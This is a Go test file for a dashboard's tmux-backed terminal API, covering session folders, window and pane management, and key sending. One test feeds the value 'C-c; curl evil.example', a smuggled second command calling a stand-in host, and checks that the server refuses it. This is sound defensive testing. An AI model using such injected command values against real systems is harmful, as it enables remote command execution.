package api

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/Wayy01/Just-Dashboard/backend/internal/audit"
	"github.com/Wayy01/Just-Dashboard/backend/internal/auth"
	"github.com/Wayy01/Just-Dashboard/backend/internal/config"
	"github.com/Wayy01/Just-Dashboard/backend/internal/httpx"
	"github.com/Wayy01/Just-Dashboard/backend/internal/store"
	"github.com/go-chi/chi/v5"
)

// These drive the real handlers against a real tmux, because the bug they
// exist to catch was not in any one function: creating a session answered
// correctly, tmux stored the folder correctly, and the listing read from tmux
// correctly — and the sequence of the three put a new session in the wrong
// group for the first half-second of its life, which is exactly the window the
// page refreshes in. Only the round trip shows it.

func terminalServer(t *testing.T) (*Server, http.Handler) {
	t.Helper()
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux is not installed on this machine")
	}
	st, err := store.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })

	sealer, err := auth.NewSealer(strings.Repeat("ab", 32))
	if err != nil {
		t.Fatal(err)
	}
	_, loopback, _ := net.ParseCIDR("127.0.0.1/32")
	cfg := &config.Config{
		Addr:           "127.0.0.1:8080",
		DataDir:        t.TempDir(),
		AllowedCIDRs:   []*net.IPNet{loopback},
		Require2FA:     true,
		SessionTTL:     time.Hour,
		IdleTTL:        time.Minute,
		FileRoots:      []string{t.TempDir()},
		LogRoots:       []string{t.TempDir()},
		TerminalEnable: true,
	}
	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	svc := auth.NewService(st, sealer, cfg.SessionTTL, cfg.IdleTTL, cfg.Require2FA)
	s := New(cfg, log, st, svc, sealer, audit.New(st, log), nil)
	if !s.modules.term.TmuxAvailable() {
		t.Skip("the terminal module did not find tmux")
	}
	if _, err := s.modules.term.Account(); err != nil {
		t.Skipf("no account to open a session as: %v", err)
	}

	// Every tmux session this test opens has to be closed, or it outlives the
	// test run on the developer's machine — which is the whole property the
	// feature is built on, and a nuisance in a test.
	// context.Background, not t.Context: the test's context is already
	// cancelled by the time cleanups run, so the `tmux kill-session` would
	// never be executed and every session this test opened would outlive the
	// run — which the next test then sees, because the tmux server is the
	// machine's and not this process's.
	t.Cleanup(func() {
		for _, sess := range s.modules.term.List() {
			s.modules.term.Kill(context.Background(), sess.ID)
		}
		s.Shutdown()
	})

	r := chi.NewRouter()
	// The capability middleware on the route group needs somebody to check.
	r.Use(func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
			p := &httpx.Principal{
				User: &auth.User{ID: 1, Username: "tester"},
				Role: auth.RoleAdmin, Kind: "session", IP: "127.0.0.1",
			}
			next.ServeHTTP(w, req.WithContext(httpx.WithPrincipal(req.Context(), p)))
		})
	})
	s.mountTerminalRoutes(r)
	return s, r
}

// TestMain gives this package's tests a tmux server of their own.
//
// Two reasons, and both are the difference between a test suite that passes
// and one that means anything. The obvious one is the developer's machine: the
// terminal's whole promise is that a session outlives the process that made
// it, so a test that opened one against the real tmux server would leave it
// there, and a test that listed sessions would find the operator's. The other
// is that `go test ./...` runs packages concurrently — the sessions this
// package creates and the ones another package creates would land on the same
// server and appear in each other's listings, which is exactly the sort of
// cross-talk the feature must never have and a test must never invent.
//
// tmux takes its socket directory from TMUX_TMPDIR, and every `tmux` this
// package runs is a child of this process, so setting it here is enough.
func TestMain(m *testing.M) {
	dir, err := os.MkdirTemp("", "jdtmux")
	if err == nil {
		// Short, because a unix socket path has about a hundred characters to
		// play with and a nested temp directory can spend them all.
		os.Setenv("TMUX_TMPDIR", dir)
		defer os.RemoveAll(dir)
	}
	code := m.Run()
	// The server outlives the tests otherwise: that is the property under
	// test, and a stray tmux server per run is not a legacy worth keeping.
	exec.Command("tmux", "kill-server").Run()
	if err == nil {
		os.RemoveAll(dir)
	}
	os.Exit(code)
}

type apiCall struct {
	t       *testing.T
	handler http.Handler
}

func (c apiCall) do(method, path string, body any, confirm string) *httptest.ResponseRecorder {
	c.t.Helper()
	var reader io.Reader
	if body != nil {
		encoded, err := json.Marshal(body)
		if err != nil {
			c.t.Fatal(err)
		}
		reader = bytes.NewReader(encoded)
	}
	req := httptest.NewRequest(method, path, reader)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	if confirm != "" {
		req.Header.Set("X-Confirm", confirm)
	}
	rec := httptest.NewRecorder()
	c.handler.ServeHTTP(rec, req)
	return rec
}

func (c apiCall) ok(method, path string, body any, confirm string) *httptest.ResponseRecorder {
	c.t.Helper()
	rec := c.do(method, path, body, confirm)
	if rec.Code >= 300 {
		c.t.Fatalf("%s %s = %d: %s", method, path, rec.Code, rec.Body.String())
	}
	return rec
}

type listResponse struct {
	Enabled  bool             `json:"enabled"`
	Folders  []terminalFolder `json:"folders"`
	Sessions []workspace      `json:"sessions"`
}

func (c apiCall) list() listResponse {
	c.t.Helper()
	rec := c.ok(http.MethodGet, "/terminal/", nil, "")
	var out listResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		c.t.Fatalf("decoding the listing: %v", err)
	}
	return out
}

func (l listResponse) session(t *testing.T, title string) workspace {
	t.Helper()
	for _, s := range l.Sessions {
		if s.Title == title {
			return s
		}
	}
	t.Fatalf("no session called %q in %+v", title, l.Sessions)
	return workspace{}
}

func (c apiCall) create(title, folder string) workspace {
	c.t.Helper()
	rec := c.ok(http.MethodPost, "/terminal/", map[string]any{
		"title": title, "folder": folder, "persist": true, "rows": 24, "cols": 80,
	}, "")
	var created workspace
	if err := json.Unmarshal(rec.Body.Bytes(), &created); err != nil {
		c.t.Fatal(err)
	}
	return created
}

// The reported bug, end to end.
//
// "I create a folder, then New session inside this folder makes a session that
// is not in the folder but in Other. Then the normal New session makes another
// one in Other, and the first one moves into the folder I made."
//
// Every step of that is this test: create the folder, create a session in it,
// read the listing the page reads immediately afterwards, then create a second
// session and read it again. The first listing used to put the new session
// under no folder, and the second used to show the two sessions swapping
// places, because tmux had caught up in between.
func TestSessionCreatedInAFolderIsInThatFolderImmediately(t *testing.T) {
	_, handler := terminalServer(t)
	api := apiCall{t, handler}

	api.ok(http.MethodPost, "/terminal/folders", map[string]any{
		"name": "deploy", "colour": "blue",
	}, "")

	inFolder := api.create("migration", "deploy")
	if inFolder.Folder != "deploy" {
		t.Fatalf("the create response says folder=%q, want deploy", inFolder.Folder)
	}
	// The folder's colour is inherited, so a group looks like a group without
	// the operator painting every session in it.
	if inFolder.Colour != "blue" {
		t.Errorf("the new session's colour = %q, want blue inherited from the folder", inFolder.Colour)
	}

	first := api.list()
	got := first.session(t, "migration")
	if got.Folder != "deploy" {
		t.Fatalf("the listing taken straight after the create puts the session in %q, want deploy", got.Folder)
	}
	if got.Colour != "blue" {
		t.Errorf("colour = %q in the first listing, want blue", got.Colour)
	}

	// The second half of the report: opening an unrelated session must not
	// move the first one anywhere.
	api.create("scratch", "")
	second := api.list()
	if moved := second.session(t, "migration"); moved.Folder != "deploy" {
		t.Errorf("after a second session was opened, the first is in %q, want deploy", moved.Folder)
	}
	if scratch := second.session(t, "scratch"); scratch.Folder != "" {
		t.Errorf("the unfiled session landed in %q, want no folder", scratch.Folder)
	}
	if len(second.Sessions) != 2 {
		t.Errorf("the listing has %d sessions, want 2", len(second.Sessions))
	}
}

// Dragging a session into a folder sends the folder and nothing else. The
// server merges it onto what the session already has — the earlier shape,
// where the client echoed every field, erased whatever it had not looked at
// recently.
func TestPartialMetaUpdateKeepsTheRest(t *testing.T) {
	_, handler := terminalServer(t)
	api := apiCall{t, handler}
	created := api.create("api server", "")

	path := "/terminal/persistent/" + created.TmuxName
	api.ok(http.MethodPatch, path, map[string]any{"folder": "infra"}, "")
	after := api.list().session(t, "api server")
	if after.Folder != "infra" {
		t.Fatalf("folder = %q after the drag, want infra", after.Folder)
	}

	api.ok(http.MethodPatch, path, map[string]any{"colour": "red"}, "")
	api.ok(http.MethodPatch, path, map[string]any{"favourite": true}, "")
	final := api.list().session(t, "api server")
	if final.Title != "api server" || final.Folder != "infra" {
		t.Errorf("a colour change disturbed the rest: %+v", final)
	}
	if final.Colour != "red" || !final.Favourite {
		t.Errorf("the changes did not stick: %+v", final)
	}
}

// Renaming a folder moves everything filed under it, in one request. Doing it
// as a loop in the browser left half the sessions in a folder that no longer
// existed whenever the tab was closed midway.
func TestRenamingAFolderMovesItsSessions(t *testing.T) {
	_, handler := terminalServer(t)
	api := apiCall{t, handler}
	api.ok(http.MethodPost, "/terminal/folders", map[string]any{"name": "staging"}, "")
	api.create("web", "staging")
	api.create("worker", "staging")

	api.ok(http.MethodPatch, "/terminal/folders/staging",
		map[string]any{"name": "production", "colour": "amber"}, "")

	after := api.list()
	names := []string{}
	for _, f := range after.Folders {
		names = append(names, f.Name)
	}
	if len(names) != 1 || names[0] != "production" {
		t.Fatalf("folders = %v, want [production]", names)
	}
	for _, title := range []string{"web", "worker"} {
		s := after.session(t, title)
		if s.Folder != "production" {
			t.Errorf("%s stayed in %q", title, s.Folder)
		}
		if s.Colour != "amber" {
			t.Errorf("%s was not repainted with its folder: colour=%q", title, s.Colour)
		}
	}
}

// Deleting a folder unfiles what was in it and closes nothing: it is filing,
// not a destructive action, which is why it carries no typed confirmation.
func TestDeletingAFolderUnfilesItsSessions(t *testing.T) {
	_, handler := terminalServer(t)
	api := apiCall{t, handler}
	api.ok(http.MethodPost, "/terminal/folders", map[string]any{"name": "temp"}, "")
	api.create("shell", "temp")

	api.ok(http.MethodDelete, "/terminal/folders/temp", nil, "")

	after := api.list()
	if len(after.Folders) != 0 {
		t.Errorf("folders = %+v, want none", after.Folders)
	}
	s := after.session(t, "shell")
	if s.Folder != "" {
		t.Errorf("the session is still filed under %q", s.Folder)
	}
	if !s.Live {
		t.Error("deleting a folder must not touch what is running in it")
	}
}

// Two folders cannot share a name, however it is capitalised: the name is the
// key both the record and every session's tmux option are matched on.
func TestFolderNamesAreUnique(t *testing.T) {
	_, handler := terminalServer(t)
	api := apiCall{t, handler}
	api.ok(http.MethodPost, "/terminal/folders", map[string]any{"name": "deploy"}, "")
	rec := api.do(http.MethodPost, "/terminal/folders", map[string]any{"name": "Deploy"}, "")
	if rec.Code != http.StatusConflict {
		t.Fatalf("a duplicate folder = %d, want 409: %s", rec.Code, rec.Body.String())
	}
}

// Reordering is a whole-list replace, because that is what a drag produces:
// the client already holds the arrangement it wants.
func TestFolderOrderIsKept(t *testing.T) {
	_, handler := terminalServer(t)
	api := apiCall{t, handler}
	for _, name := range []string{"a", "b", "c"} {
		api.ok(http.MethodPost, "/terminal/folders", map[string]any{"name": name}, "")
	}
	api.ok(http.MethodPut, "/terminal/folders", map[string]any{
		"folders": []map[string]any{{"name": "c"}, {"name": "a", "colour": "green"}, {"name": "b"}},
	}, "")

	after := api.list()
	got := []string{}
	for _, f := range after.Folders {
		got = append(got, f.Name)
	}
	if strings.Join(got, ",") != "c,a,b" {
		t.Fatalf("order = %v, want [c a b]", got)
	}
	if after.Folders[1].Colour != "green" {
		t.Errorf("the colour did not survive the reorder: %+v", after.Folders[1])
	}
}

// The windows of a session, through the routes the strip actually calls:
// create, rename, colour, reorder by drag, and close behind its phrase.
func TestWindowsCanBeNamedColouredReorderedAndClosed(t *testing.T) {
	s, handler := terminalServer(t)
	api := apiCall{t, handler}
	created := api.create("build", "")
	base := "/terminal/persistent/" + created.TmuxName

	waitForWindows(t, s, created.TmuxName, 1)
	api.ok(http.MethodPost, base+"/windows", map[string]any{"name": "logs"}, "")
	api.ok(http.MethodPost, base+"/windows", map[string]any{"name": "shell"}, "")
	waitForWindows(t, s, created.TmuxName, 3)

	windows := fetchWindows(t, api, base)
	api.ok(http.MethodPatch, base+"/windows/"+itoa(windows[0].Index),
		map[string]any{"name": "compile", "colour": "violet"}, "")

	windows = fetchWindows(t, api, base)
	if windows[0].Name != "compile" || windows[0].Colour != "violet" {
		t.Fatalf("rename and colour did not stick: %+v", windows[0])
	}

	// The drag: the last window dropped at the front of the strip.
	last := windows[2]
	api.ok(http.MethodPatch, base+"/windows/"+itoa(last.Index),
		map[string]any{"position": 0}, "")
	windows = fetchWindows(t, api, base)
	if windows[0].Name != last.Name {
		t.Errorf("after the drag the strip starts with %q, want %q", windows[0].Name, last.Name)
	}

	// Closing takes no typed phrase, unlike the rest of the destructive
	// surface. Closing a shell is an everyday act, and a phrase in front of one
	// gets typed rather than read — which is the habit the typed confirmation
	// exists to prevent everywhere it does still apply.
	victim := windows[1]
	api.ok(http.MethodDelete, base+"/windows/"+itoa(victim.Index), nil, "")
	if got := fetchWindows(t, api, base); len(got) != 2 {
		t.Errorf("after closing one there are %d windows, want 2", len(got))
	}
}

// Splitting and closing panes, through the routes the pane bar calls.
func TestPanesSplitAndClose(t *testing.T) {
	s, handler := terminalServer(t)
	api := apiCall{t, handler}
	created := api.create("panes", "")
	base := "/terminal/persistent/" + created.TmuxName
	waitForWindows(t, s, created.TmuxName, 1)

	windows := fetchWindows(t, api, base)
	window := itoa(windows[0].Index)

	api.ok(http.MethodPost, base+"/windows/"+window+"/panes", map[string]any{"vertical": true}, "")
	panes := fetchPanes(t, api, base+"/windows/"+window+"/panes")
	if len(panes) != 2 {
		t.Fatalf("after a split there are %d panes, want 2", len(panes))
	}
	// A pane's label is what is running in it, which is the only useful one.
	if panes[0].Command == "" {
		t.Error("a pane with no command has nothing to identify it by")
	}

	api.ok(http.MethodPatch, base+"/windows/"+window+"/panes/"+itoa(panes[1].Index),
		map[string]any{"zoom": true}, "")
	api.ok(http.MethodDelete, base+"/windows/"+window+"/panes/"+itoa(panes[1].Index), nil, "")
	if got := fetchPanes(t, api, base+"/windows/"+window+"/panes"); len(got) != 1 {
		t.Fatalf("after closing one there are %d panes, want 1", len(got))
	}

	// And the window's only pane is refused, because tmux would take the
	// window with it.
	rec := api.do(http.MethodDelete, base+"/windows/"+window+"/panes/0", nil, "")
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("closing the last pane = %d, want 400: %s", rec.Code, rec.Body.String())
	}
}

// A window dragged out of one session and dropped on another in the rail.
func TestWindowMovesBetweenSessions(t *testing.T) {
	s, handler := terminalServer(t)
	api := apiCall{t, handler}
	from := api.create("source", "")
	to := api.create("dest", "")
	waitForWindows(t, s, from.TmuxName, 1)
	waitForWindows(t, s, to.TmuxName, 1)

	fromBase := "/terminal/persistent/" + from.TmuxName
	api.ok(http.MethodPost, fromBase+"/windows", map[string]any{"name": "moving"}, "")
	waitForWindows(t, s, from.TmuxName, 2)

	windows := fetchWindows(t, api, fromBase)
	api.ok(http.MethodPatch, fromBase+"/windows/"+itoa(windows[1].Index),
		map[string]any{"session": to.TmuxName}, "")

	if got := fetchWindows(t, api, fromBase); len(got) != 1 {
		t.Errorf("the source kept %d windows, want 1", len(got))
	}
	arrived := fetchWindows(t, api, "/terminal/persistent/"+to.TmuxName)
	if len(arrived) != 2 || arrived[1].Name != "moving" {
		t.Errorf("the destination has %+v, want the moved window appended", arrived)
	}
}

// Sending keys is a way to run a command on the host, so the key names are a
// closed list and anything outside it is refused rather than passed to tmux.
func TestSendKeysRefusesAnUnknownKey(t *testing.T) {
	s, handler := terminalServer(t)
	api := apiCall{t, handler}
	created := api.create("keys", "")
	waitForWindows(t, s, created.TmuxName, 1)
	base := "/terminal/persistent/" + created.TmuxName
	window := itoa(fetchWindows(t, api, base)[0].Index)

	rec := api.do(http.MethodPost, base+"/windows/"+window+"/keys",
		map[string]any{"keys": []string{"C-c; curl evil.example"}}, "")
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("an unknown key = %d, want 400: %s", rec.Code, rec.Body.String())
	}
	api.ok(http.MethodPost, base+"/windows/"+window+"/keys",
		map[string]any{"keys": []string{"C-c"}}, "")
}

type testWindow struct {
	Index  int    `json:"index"`
	Name   string `json:"name"`
	Colour string `json:"colour"`
	Panes  int    `json:"panes"`
}

type testPane struct {
	Index   int    `json:"index"`
	Command string `json:"command"`
}

func fetchWindows(t *testing.T, api apiCall, base string) []testWindow {
	t.Helper()
	rec := api.ok(http.MethodGet, base+"/windows", nil, "")
	var out []testWindow
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	return out
}

func fetchPanes(t *testing.T, api apiCall, path string) []testPane {
	t.Helper()
	rec := api.ok(http.MethodGet, path, nil, "")
	var out []testPane
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	return out
}

// tmux creates a session asynchronously — the PTY has been handed the command
// and the server may still be starting — so anything addressing a session by
// name has to wait for it to exist first.
func waitForWindows(t *testing.T, s *Server, name string, want int) {
	t.Helper()
	for attempt := 0; attempt < 60; attempt++ {
		windows, err := s.modules.term.Windows(context.Background(), name)
		if err == nil && len(windows) >= want {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("session %s never reported %d windows", name, want)
}

func itoa(v int) string { return strconv.Itoa(v) }
